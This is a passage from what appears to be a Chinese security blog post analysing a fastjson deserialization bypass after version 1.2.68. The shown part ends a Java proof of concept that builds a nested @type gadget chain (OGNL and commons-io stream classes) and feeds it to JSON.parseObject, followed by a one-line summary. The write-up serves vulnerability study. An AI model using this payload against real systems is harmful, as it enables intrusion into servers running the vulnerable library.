+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;      }\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;    },\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;    \&#34;su19\&#34;: {\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;      \&#34;@type\&#34;: \&#34;ognl.Evaluation\&#34;,\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;      \&#34;node\&#34;: {\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;        \&#34;@type\&#34;: \&#34;ognl.ASTMethod\&#34;,\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;        \&#34;p\&#34;: {\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;          \&#34;@type\&#34;: \&#34;ognl.OgnlParser\&#34;,\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;          \&#34;stream\&#34;: {\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;            \&#34;@type\&#34;: \&#34;org.apache.commons.io.input.BOMInputStream\&#34;,\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;            \&#34;delegate\&#34;: {\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;              \&#34;@type\&#34;: \&#34;org.apache.commons.io.input.ReaderInputStream\&#34;,\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;              \&#34;reader\&#34;: {\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;      \&#34;@type\&#34;:\&#34;org.apache.commons.io.input.XmlStreamReader\&#34;,\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;      \&#34;is\&#34;:{\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;        \&#34;@type\&#34;:\&#34;org.apache.commons.io.input.TeeInputStream\&#34;,\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;        \&#34;input\&#34;:{\&#34;$ref\&#34;: \&#34;$.su16.node.p.stream.delegate.reader.is.input\&#34;},\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;        \&#34;branch\&#34;:{\&#34;$ref\&#34;: \&#34;$.su16.node.p.stream.delegate.reader.is.branch\&#34;},\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;        \&#34;closeBranch\&#34;: true\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;      },\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;      \&#34;httpContentType\&#34;:\&#34;text/xml\&#34;,\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;      \&#34;lenient\&#34;:false,\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;      \&#34;defaultEncoding\&#34;:\&#34;UTF-8\&#34;\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;    },\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;              \&#34;charsetName\&#34;: \&#34;UTF-8\&#34;,\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;              \&#34;bufferSize\&#34;: 1024\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;            },\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;            \&#34;boms\&#34;: [{\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;              \&#34;@type\&#34;: \&#34;org.apache.commons.io.ByteOrderMark\&#34;,\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;              \&#34;charsetName\&#34;: \&#34;UTF-8\&#34;,\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;              \&#34;bytes\&#34;: [\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;                36,82\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;              ]\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;            }]\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;          }\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;        }\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;      }\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;    },  \r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;  }\r\n&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;&#34;</span>;
+</span></span><span style=display:flex><span>        System.<span style=color:#a6e22e>out</span>.<span style=color:#a6e22e>println</span>(poc2);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        JSON.<span style=color:#a6e22e>parseObject</span>(poc2);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><h2 id=总结>总结
+<a class=anchor href=#%e6%80%bb%e7%bb%93>#</a></h2><p>核心的绕过和之前的版本感觉差别不大，自己调试一遍会更好的理解。</p></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><a href=#1268-的修复>1.2.68 的修复</a></li><li><a href=#漏洞原理>漏洞原理</a></li><li><a href=#漏洞复现>漏洞复现</a></li><li><a href=#调试分析>调试分析</a></li><li><a href=#poc>POC</a></li><li><a href=#总结>总结</a></li></ul></nav></div></aside></main><script>(function(){var e,n,t=document.querySelector(".homepage-tree");t&&t.addEventListener("click",function(e){var t,n,s,i=e.target.closest(".home-tree-toggle"),a=e.target.closest(".home-section-label"),o=i||a;if(!o)return;if(s=o.closest("li"),!s)return;if(n=s.querySelector(".home-tree-children"),t=s.querySelector(".home-tree-toggle"),!n||!t)return;e.preventDefault(),n.classList.contains("hidden")?(n.classList.remove("hidden"),t.classList.remove("collapsed"),t.classList.add("expanded")):(n.classList.add("hidden"),t.classList.remove("expanded"),t.classList.add("collapsed"))}),e=document.createElement("div"),e.className="preview-tooltip",document.body.appendChild(e),document.querySelectorAll(".home-article-link[data-summary]").forEach(function(t){t.addEventListener("mouseenter",function(s){if(window.innerWidth<=768)return;var o=t.getAttribute("data-summary");if(!o)return;n=setTimeout(function(){var t,n,i=o.length>200?o.substring(0,200)+"...":o;e.textContent=i,e.style.display="block",t=s.clientX+15,n=s.clientY+15,t+420>window.innerWidth&&(t=s.clientX-420-15),n+100>window.innerHeight&&(n=s.clientY-100),e.style.left=t+"px",e.style.top=n+"px"},500)}),t.addEventListener("mouseleave",function(){clearTimeout(n),e.style.display="none"})})})()</script></body></html>
